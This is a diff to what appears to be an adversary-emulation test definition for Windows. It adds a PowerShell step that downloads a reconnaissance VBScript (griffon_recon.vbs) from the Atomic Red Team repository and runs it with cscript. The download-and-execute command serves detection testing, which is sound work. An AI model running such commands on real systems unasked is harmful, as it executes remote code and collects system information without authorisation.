@@ -15,6 +15,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Sample script file must exist on disk at specified location (#{vbscript})
+      inline: |
+        if (Test-Path "#{vbscript}") {exit 0} else {{New-Item -Type Directory (split-path "#{vbscript}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
+        }}
+      executor: powershell
     - name: griffon-recon
       inline: |
         cscript "{{.Args.vbscript}}"
